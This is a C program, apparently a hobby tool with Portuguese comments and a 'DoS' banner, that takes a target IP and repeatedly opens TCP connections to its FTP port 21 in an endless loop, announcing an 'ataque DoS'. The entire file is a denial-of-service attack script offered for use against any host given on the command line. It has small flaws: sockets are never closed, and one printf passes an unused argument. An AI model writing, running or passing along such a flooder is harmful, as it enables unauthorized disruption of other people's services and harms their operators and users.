#include <stdio.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/time.h>

int main(int argc, char *argv[]){

    printf("\n");
    printf("\033[0;32m");

    printf("===================================================\n");

    // Imprime o texto em ASCII art com cores
    printf("  _____        _____ \n");
    printf(" |  __ \\      / ____|\n");
    printf(" | |  | | ___| (___  \n");
    printf(" | |  | |/ _ \\\\___ \\ \n");
    printf(" | |__| | (_) |___) |\n");
    printf(" |_____/ \\___/_____/ \n");
    printf("                     \n");

    printf("\033[1;33m");
    printf("                     by Fernanda Pessoa\n");
   
    printf("\033[1;32m");
    printf("\n==================================================\n");

    // Reseta a cor para o padrão
    printf("\033[0m");

    // Verificação se um argumento foi passado
    if (argc != 2) {
        printf("Nenhum IP foi especificado.\nModo de uso: %s <IP do destino>\n", argv[0]);
        return 1;
    }

    int meusocket;
    int conecta;
    int porta = 21; //porta FTP
    char *destino;

    destino = argv[1]; // Recebe o IP de destino passado como argumento

    // Verificação da conversão do IP
    if (inet_addr(destino) == INADDR_NONE) {
        printf("IP inválido: %s\n", destino);
        return 1;
    }

    struct sockaddr_in alvo;  // Estrutura que contém as informações do alvo (IP, porta)
    struct timeval timeout;   // Estrutura para configurar o timeout

    // Definir um timeout de 2 segundos
    timeout.tv_sec = 2;
    timeout.tv_usec = 0;

    printf("Iniciando ataque DoS no IP %s...\n\n", destino);

    int tentativa = 1;
    while(1) {

        meusocket = socket(AF_INET, SOCK_STREAM, 0);
        if (meusocket < 0) {
            printf("Erro ao criar o socket na porta %d\n", porta);
            continue;  // Vai para a próxima porta se houver erro ao criar o socket
        }

        // Aplicar o timeout ao socket
        setsockopt(meusocket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
        setsockopt(meusocket, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout, sizeof(timeout));

        // Definindo a família do endereço como IPv4
        alvo.sin_family = AF_INET;

        // Configurando a porta alvo
        alvo.sin_port = htons(porta);

        // Definindo o endereço IP do alvo
        alvo.sin_addr.s_addr = inet_addr(destino);

        // Tentando conectar ao alvo com as informações do socket
        conecta = connect(meusocket, (struct sockaddr *)&alvo, sizeof(alvo));

        // Se a conexão for bem-sucedida (connect retorna 0)
        if (conecta == 0) {
            printf("Atacando porta %d - status [ABERTA], tentativa: %d\n", porta, tentativa);
        } else {
            printf("Atacando porta %d - status [FECHADA]\n", porta, tentativa);
        }

        tentativa++;
    }
    return 0;
}
